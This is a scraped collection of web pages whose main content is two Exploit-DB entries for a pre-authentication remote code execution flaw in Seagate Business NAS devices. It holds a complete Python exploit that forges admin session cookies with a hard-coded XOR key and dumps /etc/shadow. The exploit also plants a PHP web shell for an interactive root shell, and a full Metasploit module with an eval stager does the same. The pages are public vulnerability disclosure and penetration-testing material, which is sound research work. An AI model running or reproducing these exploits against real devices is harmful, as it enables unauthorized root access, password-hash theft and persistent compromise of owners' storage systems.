=== Content from packetstormsecurity.com_809a0b8d_20250124_134343.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.exploit-db.com_e7b08435_20250124_134345.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Seagate Business NAS 2014.00319 - Remote Code Execution

#### EDB-ID:

###### 36202

#### CVE:

###### [2014-8687](https://nvd.nist.gov/vuln/detail/CVE-2014-8687)

---

**EDB Verified:**

#### Author:

###### [OJ Reeves](/?author=6968)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Hardware](/?platform=hardware)

#### Date:

###### 2015-03-01

---

**Vulnerable App:**

```
#!/usr/bin/env python
#
# Seagape
# =======
# Seagate Business NAS pre-authentication remote code execution
# exploit as root user.
#
# by OJ Reeves (@TheColonial) - for full details please see
# https://beyondbinary.io/advisory/seagate-nas-rce/
#
# Usage
# =====
# seagape.py <ip> <port> [-c [ua]]
#
# - ip   : ip or host name of the target NAS
# - port : port of the admin web ui
# - -c   : (optional) create a cookie which will give admin access.
#          Not specifying this flag results in webshell installation.
# - ua   : (optional) the user agent used by the browser for the
#          admin session (UA must match the target browser).
#          Default value is listed below
#
# Example
# =======
# Install and interact with the web shell:
# seagape.py 192.168.0.1 80
#
# Create admin cookie
# seagape.py 192.168.0.1 80 -c

import base64
import hashlib
import itertools
import os
import re
import socket
import sys
import urllib
import urllib2
import uuid
import xml.sax.saxutils

if len(sys.argv) < 3:
    print "Usage: {0} <ip> <port> [-c [user agent]]".format(sys.argv[0])
    sys.exit(1)

# Every Seagate nas has the same XOR key. Great.
XOR_KEY = '0f0a000d02011f0248000d290d0b0b0e03010e07'

# This is the User agent we'll use for most of the requests
DEFAULT_UA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10'

# This is the description we're going to be reading from
LFI_FILE = '/etc/devicedesc'

# the base globals that will hold our state
host = sys.argv[1]
port = int(sys.argv[2])
cis = ''
hostname = ''
webshell = str(uuid.uuid1()) + ".php"

def chunks(s, n):
    for i in xrange(0, len(s), n):
        yield s[i:i + n]

def forward_interleave(a, b):
    return ''.join(itertools.chain(*zip(itertools.cycle(a), b)))

def xor(s, k):
    return ''.join(chr(ord(a) ^ ord(b)) for a, b in itertools.izip(s, itertools.cycle(k)))

def sha1(s):
    return hashlib.sha1(s).hexdigest()

def decode(s):
    f = xor(s, XOR_KEY)
    return ''.join(chr(ord(a) ^ ord(b)) for a, b in chunks(f, 2))

def encode(s):
    s = forward_interleave(sha1(s), s)
    s = ''.join(a + chr(ord(a) ^ ord(b)) for a, b in chunks(s, 2))
    return xor(s, XOR_KEY)

def make_request(uri = "/", ci_session = None, headers = None, post_data = None):

    method = 'GET'

    if not headers:
        headers = {}

    headers['Host'] = host

    if 'User-Agent' not in headers:
        headers['User-Agent'] = DEFAULT_UA

    if 'Accept' not in headers:
        headers['Accept'] = 'text/html'

    if post_data:
        method = 'POST'
        post_data = urllib.urlencode(post_data)
        headers['Content-Type'] = 'application/x-www-form-urlencoded'

    if ci_session:
        ci_session = urllib.quote(base64.b64encode(encode(ci_session)))
        headers['Cookie'] = 'ci_session={0}'.format(ci_session)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    http  = ""
    http += "{0} {1} HTTP/1.1\r\n".format(method, uri)

    for h in headers:
        http += "{0}: {1}\r\n".format(h, headers[h])

    if post_data:
        http += "Content-Length: {0}\r\n".format(len(post_data))

    http += "\r\n"

    if post_data:
        http += post_data

    s.send(http)

    result = ""
    while True:
        data = s.recv(1024)
        if not data:
            break
        result += data

    s.close()

    return result

def get_ci_session():
    resp = make_request()

    for l in resp.split("\r\n"):
        m = re.findall("Set-Cookie: ([a-zA-Z0-9_\-]+)=([a-zA-Z0-9\+%=/]+);", l)
        for name, value in m:
            if name == 'ci_session' and len(value) > 40:
                return decode(base64.b64decode(urllib.unquote(value)))

    print "Unable to establish session with {0}".format(host)
    sys.exit(1)

def add_string(ci_session, key, value):
    prefix = 's:{0}:"{1}";s:'.format(len(key), key)
    if prefix in ci_session:
        ci_session = re.sub(r'{0}\d+:"[^"]*"'.format(prefix), '{0}{1}:"{2}"'.format(prefix, len(value), value), ci_session)
    else:
        # doesn't exist, so we need to add it to the start and the end.
        count = int(ci_session.split(':')[1]) + 1
        ci_session = re.sub(r'a:\d+(.*)}$', r'a:{0}\1{1}{2}:"{3}";}}'.format(count, prefix, len(value), value), ci_session)
    return ci_session

def set_admin(ci_session):
    return add_string(ci_session, "is_admin", "yes")

def set_language(ci_session, lang):
    return add_string(ci_session, "language", lang)

def include_file(ci_session, file_path):
    if file_path[0] == '/':
        file_path = '../../../../../..' + file_path
    return set_language(ci_session, file_path + "\x00")

def read_file(file_path, post_data = None):
    resp = make_request(ci_session = include_file(cis, file_path), headers = {}, post_data = post_data)
    return resp

def hashdump():
    shadow = read_file('/etc/shadow')
    for l in shadow.split("\n"):
        if l and ':!:' not in l and ':x:' not in l:
            parts = l.split(':')
            print "{0}:{1}".format(parts[0], parts[1])

def cmd(command):
    headers = {
        'Content-Type' : 'application/x-www-form-urlencoded',
        'Accept' : '*/*',
        'User-Agent' : DEFAULT_UA
    }

    post_data = urllib.urlencode({'c' : command})
    headers['Content-Type'] = 'application/x-www-form-urlencoded'

    ci_session = urllib.quote(base64.b64encode(encode(cis)))
    headers['Cookie'] = 'ci_session={0}'.format(ci_session)

    url = 'http://{0}:{1}/{2}'.format(host, port, webshell)
    req = urllib2.Request(url, headers = headers, data = post_data)

    return urllib2.urlopen(req).read()

def shell():
    running = True
    while running:
        c = raw_input("Shell ({0}) $ ".format(post_id))
        if c != 'quit' and c != 'exit':
            cmd(c)
        else:
            running = False

def show_admin_cookie(user_agent):
    ci_session = add_string(cis, 'is_admin', 'yes')
    ci_session = add_string(ci_session, 'username', 'admin')
    ci_session = add_string(ci_session, 'user_agent', user_agent)
    ci_session = urllib.quote(base64.b64encode(encode(ci_session)))
    print "Session cookies are bound to the browser's user agent."
    print "Using user agent: " + user_agent
    print "ci_session=" + ci_session

def show_version():
    print "Firmware Version: {0}".format(get_firmware_version())

def show_cookie():
    print cis

def show_help():
    print ""
    print "Seagape v1.0 -- Interactive Seagate NAS Webshell"
    print "  - OJ Reeves (@TheColonial) - https://beyondbinary.io/"
    print "  - https://beyondbinary.io/bbsec/001"
    print "==========================================================================="
    print "version           - Print the current firmware version to screen."
    print "dumpcookie        - Print the current cookie to screen."
    print "admincookie <ua>  - Create an admin login cookie (ua == user agent string)."
    print "                    Add to your browser and access ANY NAS box as admin."
    print "help              - Show this help."
    print "exit / quit       - Run for the hills."
    print "<anything else>   - Execute the command on the server."
    print ""

def execute(user_input):
    result = True
    parts = user_input.split(' ')
    c = parts[0]

    if c == 'admincookie':
        ua = DEFAULT_UA
        if len(parts) > 1:
            ua = ' '.join(parts[1:])
        show_admin_cookie(ua)
    elif c == 'dumpcookie':
        show_cookie()
    elif c == 'version':
        show_version()
    elif c == 'help':
        show_help()
    elif c == 'quit' or c == 'exit':
        remove_shell()
        result = False
    else:
        print cmd(user_input)
    return result

def get_firmware_version():
    resp = make_request("/index.php/mv_system/get_firmware?_=1413463189043",
            ci_session = acis)
    return resp.replace("\r", "").replace("\n", "").split("version")[1][1:-2]

def install_shell():
    resp = make_request("/index.php/mv_system/get_general_setup?_=1413463189043",
            ci_session = acis)
    existing_setup = ''
    for l in resp.split("\r\n"):
        if 'general_setup' in l:
            existing_setup = l
            break

    # generate the shell and its installer
    exec_post = base64.b64encode("<?php if(isset($_POST['c'])&&!empty($_POST['c'])){system($_POST['c']);} ?>")
    installer = '<?php file_put_contents(\'{0}\', base64_decode(\'{1}\')); ?>'.format(webshell, exec_post)
    write_php = xml.sax.saxutils.quoteattr(installer)[1:-1]
    start = existing_setup.index('" description="') + 15
    end = existing_setup.index('"', start)
    updated_setup = existing_setup[0:start] + write_php + existing_setup[end:]

    # write the shell to the description
    resp = make_request("/index.php/mv_system/set_general_setup?_=1413463189043",
            ci_session = acis,
            headers = { },
            post_data = { 'general_setup' : updated_setup })

    # invoke the installer
    read_file(LFI_FILE)

    # remove the installer
    resp = make_request("/index.php/mv_system/set_general_setup?_=1413463189043",
            ci_session = acis,
            headers = { },
            post_data = { 'general_setup' : existing_setup })

def remove_shell():
    return cmd('rm -f {0}'.format(webshell))

print "Establishing session with {0} ...".format(host)
cis = get_ci_session()

if len(sys.argv) >= 4 and sys.argv[3] == '-c':
    ua = DEFAULT_UA
    if len(sys.argv) > 4:
        ua = sys.argv[4]
    show_admin_cookie(ua)
else:
    print "Configuring administrative access ..."
    acis = add_string(cis, 'is_admin', 'yes')
    acis = add_string(acis, 'username', 'admin')

    print "Installing web shell (takes a while) ..."
    install_shell()

    print "Extracting id and hostname ..."
    identity = cmd('whoami').strip()
    hostname = cmd('cat /etc/hostname').strip()
    show_help()

    running = True
    while running:
        try:
            user_input = raw_input("Seagape ({0}@{1})> ".format(identity, hostname))
            running = execute(user_input)
        except:
            print "Something went wrong. Try again."

```

**Tags:**

[![](/screenshots/idlt36500/version-demo-thumb.png)](/screenshots/idlt36500/version-demo.png)

**Advisory/Source:**
[Link](https://beyondbinary.io/advisory/seagate-nas-rce/)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from packetstormsecurity.com_265bfbc5_20250124_134344.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.exploit-db.com_21299785_20250124_134347.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Seagate Business NAS - Remote Command Execution (Metasploit)

#### EDB-ID:

###### 36264

#### CVE:

###### [2014-8686](https://nvd.nist.gov/vuln/detail/CVE-2014-8686) [2014-8684](https://nvd.nist.gov/vuln/detail/CVE-2014-8684) [2014-8687](https://nvd.nist.gov/vuln/detail/CVE-2014-8687)

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2015-03-04

---

**Vulnerable App:**

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rexml/document'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Seagate Business NAS Unauthenticated Remote Command Execution',
      'Description'    => %q{
        Some Seagate Business NAS devices are vulnerable to command execution via a local
        file include vulnerability hidden in the language parameter of the CodeIgniter
        session cookie. The vulnerability manifests in the way the language files are
        included in the code on the login page, and hence is open to attack from users
        without the need for authentication. The cookie can be easily decrypted using a
        known static encryption key and re-encrypted once the PHP object string has been
        modified.
        This module has been tested on the STBN300 device.
      },
      'Author'         => [
          'OJ Reeves <oj[at]beyondbinary.io>' # Discovery and Metasploit module
        ],
      'References'     => [
          ['CVE', '2014-8684'],
          ['CVE', '2014-8686'],
          ['CVE', '2014-8687'],
          ['EDB', '36202'],
          ['URL', 'http://www.seagate.com/au/en/support/external-hard-drives/network-storage/business-storage-2-bay-nas/'],
          ['URL', 'https://beyondbinary.io/advisory/seagate-nas-rce/']
        ],
      'DisclosureDate' => 'Mar 01 2015',
      'Privileged'     => true,
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Payload'        => {'DisableNops' => true},
      'Targets'        => [['Automatic', {}]],
      'DefaultTarget'  => 0,
      'License'        => MSF_LICENSE
      ))

    register_options([
        OptString.new('TARGETURI', [true, 'Path to the application root', '/']),
        OptString.new('ADMINACCOUNT', [true, 'Name of the NAS admin account', 'admin']),
        OptString.new('COOKIEID', [true, 'ID of the CodeIgniter session cookie', 'ci_session']),
        OptString.new('XORKEY', [true, 'XOR Key used for the CodeIgniter session', '0f0a000d02011f0248000d290d0b0b0e03010e07'])
      ])
  end

  #
  # Write a string value to a serialized PHP object without deserializing it first.
  # If the value exists it will be updated.
  #
  def set_string(php_object, name, value)
    prefix = "s:#{name.length}:\"#{name}\";s:"
    if php_object.include?(prefix)
      # the value already exists in the php blob, so update it.
      return php_object.gsub("#{prefix}\\d+:\"[^\"]*\"", "#{prefix}#{value.length}:\"#{value}\"")
    end

    # the value doesn't exist in the php blob, so create it.
    count = php_object.split(':')[1].to_i + 1
    php_object.gsub(/a:\d+(.*)}$/, "a:#{count}\\1#{prefix}#{value.length}:\"#{value}\";}")
  end

  #
  # Findez ze holez!
  #
  def check
    begin
      res = send_request_cgi(
        'uri'      => normalize_uri(target_uri),
        'method'   => 'GET',
        'headers'  => {
          'Accept' => 'text/html'
        }
      )

      if res && res.code == 200
        headers = res.to_s

        # validate headers
        if headers.include?('X-Powered-By: PHP/5.2.13') && headers.include?('Server: lighttpd/1.4.28')
          # and make sure that the body contains the title we'd expect
          if res.body.include?('Login to BlackArmor')
            return Exploit::CheckCode::Appears
          end
        end
      end
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout, Rex::HostUnreachable
      # something went wrong, assume safe.
    end

    Exploit::CheckCode::Safe
  end

  #
  # Executez ze sploitz!
  #
  def exploit

    # Step 1 - Establish a session with the target which will give us a PHP object we can
    # work with.
    begin
      print_status("Establishing session with target ...")
      res = send_request_cgi({
        'uri'    => normalize_uri(target_uri),
        'method' => 'GET',
        'headers'  => {
          'Accept' => 'text/html'
        }
      })

      if res && res.code == 200 && res.to_s =~ /#{datastore['COOKIEID']}=([^;]+);/
        cookie_value = $1.strip
      else
        fail_with(Failure::Unreachable, "#{peer} - Unexpected response from server.")
      end
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout, Rex::HostUnreachable
      fail_with(Failure::Unreachable, "#{peer} - Unable to establish connection.")
    end

    # Step 2 - Decrypt the cookie so that we have a PHP object we can work with directly
    # then update it so that it's an admin session before re-encrypting
    print_status("Upgrading session to administrator ...")
    php_object = decode_cookie(cookie_value)
    vprint_status("PHP Object: #{php_object}")

    admin_php_object = set_string(php_object, 'is_admin', 'yes')
    admin_php_object = set_string(admin_php_object, 'username', datastore['ADMINACCOUNT'])
    vprint_status("Admin PHP object: #{admin_php_object}")

    admin_cookie_value = encode_cookie(admin_php_object)

    # Step 3 - Extract the current host configuration so that we don't lose it.
    host_config = nil

    # This time value needs to be consistent across calls
    config_time = ::Time.now.to_i

    begin
      print_status("Extracting existing host configuration ...")
      res = send_request_cgi(
        'uri'      => normalize_uri(target_uri, 'index.php/mv_system/get_general_setup'),
        'method'   => 'GET',
        'headers'  => {
          'Accept' => 'text/html'
        },
        'cookie'   => "#{datastore['COOKIEID']}=#{admin_cookie_value}",
        'vars_get' => {
          '_'      => config_time
        }
      )

      if res && res.code == 200
        res.body.split("\r\n").each do |l|
          if l.include?('general_setup')
            host_config = l
            break
          end
        end
      else
        fail_with(Failure::Unreachable, "#{peer} - Unexpected response from server.")
      end
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout, Rex::HostUnreachable
      fail_with(Failure::Unreachable, "#{peer} - Unable to establish connection.")
    end

    print_good("Host configuration extracted.")
    vprint_status("Host configuration: #{host_config}")

    # Step 4 - replace the host device description with a custom payload that can
    # be used for LFI. We have to keep the payload small because of size limitations
    # and we can't put anything in with '$' in it. So we need to make a simple install
    # payload which will write a required payload to disk that can be executes directly
    # as the last part of the payload. This will also be self-deleting.
    param_id = rand_text_alphanumeric(3)

    # There are no files on the target file system that start with an underscore
    # so to allow for a small file size that doesn't collide with an existing file
    # we'll just prefix it with an underscore.
    payload_file = "_#{rand_text_alphanumeric(3)}.php"

    installer = "file_put_contents('#{payload_file}', base64_decode($_POST['#{param_id}']));"
    stager = Rex::Text.encode_base64(installer)
    stager = xml_encode("<?php eval(base64_decode('#{stager}')); ?>")
    vprint_status("Stager: #{stager}")

    # Butcher the XML directly rather than attempting to use REXML. The target XML
    # parser is way to simple/flaky to deal with the proper stuff that REXML
    # spits out.
    desc_start = host_config.index('" description="') + 15
    desc_end = host_config.index('"', desc_start)
    xml_payload = host_config[0, desc_start] +
                  stager + host_config[desc_end, host_config.length]
    vprint_status(xml_payload)

    # Step 5 - set the host description to the stager so that it is written to disk
    print_status("Uploading stager ...")
    begin
      res = send_request_cgi(
        'uri'             => normalize_uri(target_uri, 'index.php/mv_system/set_general_setup'),
        'method'          => 'POST',
        'headers'         => {
          'Accept'        => 'text/html'
        },
        'cookie'          => "#{datastore['COOKIEID']}=#{admin_cookie_value}",
        'vars_get'        => {
          '_'             => config_time
        },
        'vars_post'       => {
          'general_setup' => xml_payload
        }
      )

      unless res && res.code == 200
        fail_with(Failure::Unreachable, "#{peer} - Stager upload failed (invalid result).")
      end
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout, Rex::HostUnreachable
      fail_with(Failure::Unreachable, "#{peer} - Stager upload failed (unable to establish connection).")
    end

    print_good("Stager uploaded.")

    # Step 6 - Invoke the stage, passing in a self-deleting php script body.
    print_status("Executing stager ...")
    payload_php_object = set_string(php_object, 'language', "../../../etc/devicedesc\x00")
    payload_cookie_value = encode_cookie(payload_php_object)
    self_deleting_payload = "<?php unlink(__FILE__);\r\n#{payload.encoded}; ?>"
    errored = false

    begin
      res = send_request_cgi(
        'uri'      => normalize_uri(target_uri),
        'method'   => 'POST',
        'headers'  => {
          'Accept' => 'text/html'
        },
        'cookie'    => "#{datastore['COOKIEID']}=#{payload_cookie_value}",
        'vars_post' => {
          param_id  => Rex::Text.encode_base64(self_deleting_payload)
        }
      )

      if res && res.code == 200
        print_good("Stager execution succeeded, payload ready for execution.")
      else
        print_error("Stager execution failed (invalid result).")
        errored = true
      end
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout, Rex::HostUnreachable
      print_error("Stager execution failed (unable to establish connection).")
      errored = true
    end

    # Step 7 - try to restore the previous configuration, allowing exceptions
    # to bubble up given that we're at the end. This step is important because
    # we don't want to leave a trail of junk on disk at the end.
    print_status("Restoring host config ...")
    res = send_request_cgi(
      'uri'             => normalize_uri(target_uri, 'index.php/mv_system/set_general_setup'),
      'method'          => 'POST',
      'headers'         => {
        'Accept'        => 'text/html'
      },
      'cookie'          => "#{datastore['COOKIEID']}=#{admin_cookie_value}",
      'vars_get'        => {
        '_'             => config_time
      },
      'vars_post'       => {
        'general_setup' => host_config
      }
    )

    # Step 8 - invoke the installed payload, but only if all went to plan.
    unless errored
      print_status("Executing payload at #{normalize_uri(target_uri, payload_file)} ...")
      res = send_request_cgi(
        'uri'      => normalize_uri(target_uri, payload_file),
        'method'   => 'GET',
        'headers'  => {
          'Accept' => 'text/html'
        },
        'cookie'   => "#{datastore['COOKIEID']}=#{payload_cookie_value}"
      )
    end
  end

  #
  # Take a CodeIgnitor cookie and pull out the PHP object using the XOR
  # key that we've been given.
  #
  def decode_cookie(cookie_content)
    cookie_value = Rex::Text.decode_base64(URI.decode(cookie_content))
    pass = xor(cookie_value, datastore['XORKEY'])
    result = ''

    (0...pass.length).step(2).each do |i|
      result << (pass[i].ord ^ pass[i + 1].ord).chr
    end

    result
  end

  #
  # Take a serialised PHP object cookie value and encode it so that
  # CodeIgniter thinks it's legit.
  #
  def encode_cookie(cookie_value)
    rand = Rex::Text.sha1(rand_text_alphanumeric(40))

    block  = ''

    (0...cookie_value.length).each do |i|
      block << rand[i % rand.length]
      block << (rand[i % rand.length].ord ^ cookie_value[i].ord).chr
    end

    cookie_value = xor(block, datastore['XORKEY'])
    cookie_value = CGI.escape(Rex::Text.encode_base64(cookie_value))
    vprint_status("Cookie value: #{cookie_value}")

    cookie_value
  end

  #
  # XOR a value against a key. The key is cycled.
  #
  def xor(string, key)
    result = ''

    string.bytes.zip(key.bytes.cycle).each do |s, k|
      result << (s ^ k)
    end

    result
  end

  #
  # Simple XML substitution because the target XML handler isn't really
  # full blown or smart.
  #
  def xml_encode(str)
    str.gsub(/</, '<').gsub(/>/, '>')
  end

end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)

**Advisory/Source:**
[Link](https://beyondbinary.io/advisory/seagate-nas-rce/)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
